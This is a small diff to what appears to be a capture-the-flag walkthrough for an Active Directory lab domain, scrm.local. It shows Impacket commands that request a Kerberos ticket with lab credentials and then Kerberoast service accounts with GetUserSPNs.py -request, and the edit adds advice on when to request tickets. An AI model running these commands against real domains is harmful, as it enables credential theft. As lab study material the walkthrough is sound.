@@ -6,7 +6,7 @@ python3 getTGT.py scrm.local/ksimpson:ksimpson
 ```
 
 - Saved ticket should be exported to KRB5CCNAME
-- Find valid user SPNs:
+- Find valid user SPNs. Perform `-request` if account is Kerberoastable:
 ```bash
 python3 GetUserSPNs.py scrm.local/ksimpson -dc-host dc1.scrm.local -k -request
 ```
